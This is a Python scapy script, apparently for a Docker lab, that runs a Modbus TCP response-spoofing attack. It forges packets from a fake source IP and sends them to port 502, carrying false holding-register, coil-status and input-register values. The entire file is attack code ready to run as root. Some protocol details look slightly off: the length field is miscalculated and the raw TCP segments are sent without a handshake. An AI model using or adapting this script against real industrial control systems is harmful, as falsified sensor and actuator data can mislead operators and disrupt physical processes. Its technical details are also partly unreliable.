#!/usr/bin/env python3
from scapy.all import *
import logging
import time
import binascii
import os

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusResponseSpoofer:
    def __init__(self, target_ip='localhost', target_port=502, spoof_ip='192.168.1.50'):
        self.target_ip = target_ip
        self.target_port = target_port
        self.spoof_ip = spoof_ip
        self.interface = "docker0"  # Default interface for Docker

    def craft_modbus_response(self, transaction_id=1, unit_id=1, function_code=3, data=b'\x00\xFF'):
        """Craft a Modbus TCP response packet"""
        # Modbus TCP header
        header = struct.pack('>HHHB',
            transaction_id,    # Transaction ID
            0,                # Protocol ID (0 for Modbus TCP)
            len(data) + 2,    # Length (data + function code + byte count)
            unit_id          # Unit ID
        )
        
        # Modbus response (function code + byte count + data)
        response = struct.pack('BB', function_code, len(data)) + data
        
        return header + response

    def send_spoofed_response(self, payload, src_port=34000):
        """Send a spoofed Modbus response packet"""
        try:
            # Create the complete packet
            packet = (
                Ether()/
                IP(dst=self.target_ip, src=self.spoof_ip)/
                TCP(dport=self.target_port, sport=src_port)/
                Raw(load=payload)
            )

            # Log packet details
            logger.info(f"\nCrafting spoofed Modbus response:")
            logger.info(f"Source IP: {self.spoof_ip}")
            logger.info(f"Target IP: {self.target_ip}")
            logger.info(f"Target Port: {self.target_port}")
            logger.info(f"Payload (hex): {binascii.hexlify(payload).decode()}")

            # Send the packet
            sendp(packet, iface=self.interface, verbose=False)
            logger.info("Spoofed response sent successfully")
            return True

        except Exception as e:
            logger.error(f"Failed to send spoofed response: {e}")
            return False

    def run_spoof_attack(self):
        """Execute a series of spoofing attacks with different payloads"""
        logger.info("\nStarting Modbus Response Spoofing Attack simulation...")

        # Test cases for different types of spoofed responses
        test_cases = [
            {
                "name": "Fake Holding Register",
                "function_code": 3,
                "data": b'\x00\xFF',  # Value 255
                "description": "Spoofing holding register with value 0x00FF"
            },
            {
                "name": "Fake Coil Status",
                "function_code": 1,
                "data": b'\xFF\x00',  # All coils ON
                "description": "Spoofing coil status with all coils ON"
            },
            {
                "name": "Fake Input Register",
                "function_code": 4,
                "data": b'\xFF\xFF',  # Maximum value
                "description": "Spoofing input register with maximum value"
            }
        ]

        for i, test_case in enumerate(test_cases, 1):
            logger.info(f"\nTest Case {i}: {test_case['name']}")
            logger.info(f"Description: {test_case['description']}")

            # Craft and send the spoofed response
            payload = self.craft_modbus_response(
                transaction_id=i,
                function_code=test_case['function_code'],
                data=test_case['data']
            )
            
            self.send_spoofed_response(payload)
            time.sleep(1)  # Delay between packets

        logger.info("\nSpoofing attack simulation completed")

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        logger.error("This script requires root privileges to send raw packets")
        logger.error("Please run with sudo")
        sys.exit(1)

    # Create and run the spoofer
    spoofer = ModbusResponseSpoofer()
    spoofer.run_spoof_attack()